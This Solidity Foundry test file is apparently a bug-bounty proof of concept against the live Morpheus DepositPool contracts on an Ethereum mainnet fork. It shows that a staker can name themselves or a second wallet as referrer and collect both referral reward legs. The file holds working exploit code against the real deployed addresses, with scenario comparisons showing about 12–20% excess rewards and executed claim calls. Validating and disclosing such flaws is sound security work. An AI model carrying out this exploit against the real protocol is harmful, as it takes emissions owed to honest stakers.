// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

/**
 * Morpheus DepositPool — Candidate DP C-1 validation (EXECUTED fork PoC)
 *
 * Claim under test: DepositPool._stake accepts ANY referrer_ with no
 * `referrer_ != user_` check. An unprivileged attacker staking with their own
 * second address (or themselves) as referrer captures BOTH referral legs on a
 * single stake:
 *   (1) referee leg: +1% virtual multiplier on their own position
 *       (ReferrerLib.REFERRAL_MULTIPLIER = 1.01 * PRECISION), and
 *   (2) referrer leg: the referrer address accrues claimable MOR on
 *       virtualAmountStaked = amountStaked * tierMultiplier, paid from the
 *       same emission stream (added into totalVirtualDeposited).
 *
 * Method: mainnet fork pinned to FORK_BLOCK. Three scenarios run from the
 * SAME base state via vm.snapshotState()/revertToState():
 *   - ATTACK-AB : attacker A stakes STAKE stETH with referrer = B (A's 2nd wallet)
 *   - SELF      : attacker A stakes STAKE stETH with referrer = A (self-referral)
 *   - HONEST    : staker H stakes STAKE stETH with referrer = address(0) (control)
 * In each scenario: stake at fork time, warp +30 days, simulate the Lido
 * rebase (see harness notes), crank Distributor.distributeRewards(0)
 * (permissionless), then read claimable entitlements via the protocol's own
 * getters getLatestUserReward / getLatestReferrerReward (these are exactly
 * the amounts _claim / _claimReferrerTier pay out).
 *
 * Harness accommodations (test scaffolding ONLY — no protocol logic altered,
 * identical in every scenario):
 *   (a) ChainLinkDataConsumer.getChainLinkDataFeedLatestAnswer is mocked per
 *       pathId to return the EXACT live price read from the real consumer at
 *       fork time. Reason: the consumer rejects feeds older than
 *       allowedPriceUpdateDelay (3600s for stETH/USD and wETH/USD), so after
 *       a 30-day vm.warp every real feed reads "stale" and
 *       Distributor.distributeRewards would revert on price=0. Prices are
 *       NOT changed — only the freshness check is bypassed, because on real
 *       mainnet the feeds would have kept updating during those 30 days.
 *   (b) Lido rebase simulation: on a static fork no Lido oracle report
 *       occurs, so the Distributor's stETH balance never grows and the
 *       stETH pool's yield share in Distributor.distributeRewards would be
 *       zero. A donor transfers REBASE stETH to the Distributor in every
 *       scenario, mimicking 30 days of rebase accrual (~3% APR on ~7.5k
 *       stETH). This only sets the pool's share of the (schedule-fixed)
 *       emissions; it is identical across scenarios and does not touch
 *       DepositPool referral accounting.
 *   (c) Attacker funding: vm.deal ETH, then the attacker wraps it into
 *       stETH through Lido's real submit() on the fork. Protocol
 *       interactions (approve/stake/claim) are the attacker's own; NO
 *       owner/admin is ever pranked.
 */

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function claimReferrerTier(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getReferrerMultiplier(uint256 rewardPoolIndex_, address referrer_) external view returns (uint256);
    function usersData(address user_, uint256 poolIndex_)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function referrersData(address referrer_, uint256 poolIndex_)
        external
        view
        returns (uint256 amountStaked, uint256 virtualAmountStaked, uint256 rate, uint256 pendingRewards, uint128 lastClaim);
    function rewardPoolsData(uint256 poolIndex_)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPool_) external view returns (uint256);
    function depositPoolAddresses(uint256 poolIndex_, uint256 i_) external view returns (address);
    function depositPools(uint256 poolIndex_, address dp_)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IChainLinkDataConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IStETH {
    function submit(address referral_) external payable returns (uint256);
    function approve(address spender_, uint256 amount_) external returns (bool);
    function transfer(address to_, uint256 amount_) external returns (bool);
    function balanceOf(address account_) external view returns (uint256);
}

contract DepositPoolSelfReferralPoC is Test {
    // ---- Deployed addresses (Appendix A, verified on-chain 2026-10-20) ----
    address constant DP_STETH = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant CLDC = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    string constant RPC = "https://ethereum-rpc.publicnode.com";
    uint256 constant FORK_BLOCK = 26232700;
    uint256 constant POOL = 0;

    uint256 constant STAKE = 90 ether; // >= 62.5 stETH tier-3 threshold (15%)
    uint256 constant REBASE = 20 ether; // simulated 30d Lido rebase to Distributor
    uint256 constant WARP = 30 days;

    IDepositPool dp = IDepositPool(DP_STETH);
    IDistributor dist = IDistributor(DIST);
    IChainLinkDataConsumer cldc = IChainLinkDataConsumer(CLDC);
    IStETH steth = IStETH(STETH);

    address attackerA = makeAddr("attackerA");
    address attackerB = makeAddr("attackerB"); // A's second wallet
    address honest = makeAddr("honestStaker");
    address donor = makeAddr("rebaseDonor");

    bytes32[] pathIds;
    uint256[] livePrices;

    struct ScenarioResult {
        uint256 deposited;
        uint256 userVirtual;
        uint256 referrerVirtual;
        uint256 userReward;
        uint256 referrerReward;
        uint256 tvdAfter;
    }

    function setUp() public {
        vm.createSelectFork(RPC, FORK_BLOCK);

        // Record the EXACT live price for every deposit-pool price path under
        // reward pool 0, straight from the real consumer, before any mocking.
        for (uint256 i = 0; i < 5; i++) {
            address dpAddr = dist.depositPoolAddresses(POOL, i);
            (, string memory path,,,,,,) = dist.depositPools(POOL, dpAddr);
            bytes32 pid = cldc.getPathId(path);
            uint256 price = cldc.getChainLinkDataFeedLatestAnswer(pid);
            require(price > 0, "live price is zero");
            pathIds.push(pid);
            livePrices.push(price);
        }

        // Fund all actors with stETH via Lido submit (their own transactions).
        _fundWithStEth(attackerA);
        _fundWithStEth(attackerB);
        _fundWithStEth(honest);
        _fundWithStEth(donor);
    }

    function _fundWithStEth(address who) internal {
        vm.deal(who, 150 ether);
        vm.prank(who);
        steth.submit{value: 120 ether}(address(0));
        require(steth.balanceOf(who) >= 100 ether, "stETH funding failed");
    }

    function _mockPrices() internal {
        for (uint256 i = 0; i < pathIds.length; i++) {
            vm.mockCall(
                CLDC,
                abi.encodeWithSelector(IChainLinkDataConsumer.getChainLinkDataFeedLatestAnswer.selector, pathIds[i]),
                abi.encode(livePrices[i])
            );
        }
    }

    /// Runs one staking scenario from the current (base) state and reverts.
    function _scenario(address staker, address referrer) internal returns (ScenarioResult memory r) {
        uint256 snap = vm.snapshotState();
        _mockPrices();

        vm.startPrank(staker);
        steth.approve(DIST, STAKE);
        dp.stake(POOL, STAKE, 0, referrer);
        vm.stopPrank();

        (, r.deposited,,,,, r.userVirtual,,) = dp.usersData(staker, POOL);
        if (referrer != address(0)) {
            (, r.referrerVirtual,,,) = dp.referrersData(referrer, POOL);
        }

        vm.warp(block.timestamp + WARP);

        // Simulated Lido rebase (harness note b), identical in all scenarios.
        vm.prank(donor);
        steth.transfer(DIST, REBASE);

        // Permissionless crank: push the 30 days of schedule emissions into
        // the pools (split by yield share, exactly as on mainnet).
        dist.distributeRewards(POOL);

        (,, r.tvdAfter) = dp.rewardPoolsData(POOL);
        r.userReward = dp.getLatestUserReward(POOL, staker);
        r.referrerReward = referrer != address(0) ? dp.getLatestReferrerReward(POOL, referrer) : 0;

        vm.revertToState(snap);
    }

    function test_C1_SelfReferralDoubleDip() public {
        ScenarioResult memory ab = _scenario(attackerA, attackerB);
        ScenarioResult memory self = _scenario(attackerA, attackerA);
        ScenarioResult memory hon = _scenario(honest, address(0));

        uint256 totalAttack = ab.userReward + ab.referrerReward;
        uint256 totalSelf = self.userReward + self.referrerReward;
        uint256 honestTotal = hon.userReward;

        console.log("=== booked accounting (right after stake) ===");
        console.log("honest  deposited / userVirtual:", hon.deposited, hon.userVirtual);
        console.log("attack  deposited / userVirtual:", ab.deposited, ab.userVirtual);
        console.log("attack  referrerVirtual (B):", ab.referrerVirtual);
        console.log("selfref referrerVirtual (A):", self.referrerVirtual);
        console.log("TVD after distribution (attack scenario):", ab.tvdAfter);

        console.log("=== claimable MOR after 30 days ===");
        console.log("honest total:", honestTotal);
        console.log("attack A user reward:", ab.userReward);
        console.log("attack B referrer reward:", ab.referrerReward);
        console.log("attack A+B total:", totalAttack);
        console.log("selfref A total (user+referrer):", totalSelf);

        uint256 excess = totalAttack - honestTotal;
        uint256 excessBps = (excess * 10000) / honestTotal;
        console.log("excess MOR (attack - honest):", excess);
        console.log("excess in bps of honest reward:", excessBps);
        console.log("referee-leg ratio bps (A user / honest):", (ab.userReward * 10000) / honestTotal);
        console.log("referrer-leg bps of A user reward:", (ab.referrerReward * 10000) / ab.userReward);

        // ---- Phantom-weight assertions (booked at stake time) ----
        // Honest staker: virtual == deposited (multiplier exactly 1.0).
        assertApproxEqAbs(hon.userVirtual, hon.deposited, 2, "honest virtual must equal deposited");
        assertEq(hon.referrerVirtual, 0, "honest must book no referrer virtual");
        // Attacker: +1% referee weight on the user side...
        assertApproxEqAbs(ab.userVirtual, (ab.deposited * 101) / 100, 2, "attacker user virtual must be deposited*1.01");
        // ...plus a 15% tier weight on the referrer side (tier3: >=62.5 stETH).
        assertApproxEqAbs(
            ab.referrerVirtual, (ab.deposited * 15) / 100, 2, "referrer virtual must be deposited*0.15 (tier 3)"
        );
        assertApproxEqAbs(
            self.referrerVirtual, (self.deposited * 15) / 100, 2, "self-referral must book the same referrer virtual"
        );

        // ---- Reward assertions (after 30 days of real schedule emissions) ----
        assertGt(honestTotal, 0, "honest staker must earn rewards (sanity)");
        assertGt(ab.referrerReward, 0, "referrer leg must pay out");
        assertGt(totalAttack, honestTotal, "C-1: A+B must exceed honest staker");
        // Model: excess ~= (1% + 15%) of gross, slightly compressed by the
        // attacker's own phantom weight inflating the rate denominator.
        assertGe(excessBps, 1200, "excess must be at least 12% of honest reward");
        assertLe(excessBps, 2000, "excess must be at most 20% of honest reward");
        // Referee leg alone: A(user) vs honest ~= +1% (compressed a hair by dilution).
        assertGe((ab.userReward * 10000) / honestTotal, 10040, "referee leg must add >=0.4%");
        assertLe((ab.userReward * 10000) / honestTotal, 10160, "referee leg must add <=1.6%");
        // Self-referral (A refers A) captures the same total as the two-wallet variant.
        assertGt(totalSelf, honestTotal, "C-1: self-referral must exceed honest staker");
        assertApproxEqRel(totalSelf, totalAttack, 1e15, "self-referral total must match two-wallet total (0.1%)");
    }

    /// Execution probe: after measuring entitlements, actually call claim()
    /// and claimReferrerTier() on the fork and report whether they succeed.
    /// Outcome is logged, not asserted (the mint settles on L2 via LayerZero;
    /// the entitlement amounts asserted in the main test are what _claim pays).
    function test_C1_ExecuteClaims() public {
        uint256 snap = vm.snapshotState();
        _mockPrices();

        vm.startPrank(attackerA);
        steth.approve(DIST, STAKE);
        dp.stake(POOL, STAKE, 0, attackerB);
        vm.stopPrank();

        vm.warp(block.timestamp + WARP);

        vm.prank(donor);
        steth.transfer(DIST, REBASE);
        dist.distributeRewards(POOL);

        uint256 userBefore = dp.getLatestUserReward(POOL, attackerA);
        uint256 refBefore = dp.getLatestReferrerReward(POOL, attackerB);
        console.log("entitlement A (user):", userBefore);
        console.log("entitlement B (referrer):", refBefore);
        assertGt(userBefore, 0, "A entitlement must be > 0 before claim");
        assertGt(refBefore, 0, "B entitlement must be > 0 before claim");

        vm.prank(attackerA);
        (bool okClaim,) =
            address(dp).call{value: 0.3 ether}(abi.encodeWithSelector(IDepositPool.claim.selector, POOL, attackerA));
        console.log("claim() succeeded:", okClaim);
        if (okClaim) {
            assertEq(dp.getLatestUserReward(POOL, attackerA), 0, "A entitlement must be consumed by claim");
        }

        vm.prank(attackerB);
        (bool okRefClaim,) = address(dp).call{value: 0.3 ether}(
            abi.encodeWithSelector(IDepositPool.claimReferrerTier.selector, POOL, attackerB)
        );
        console.log("claimReferrerTier() succeeded:", okRefClaim);
        if (okRefClaim) {
            assertEq(dp.getLatestReferrerReward(POOL, attackerB), 0, "B entitlement must be consumed by claim");
        }

        vm.revertToState(snap);
    }
}
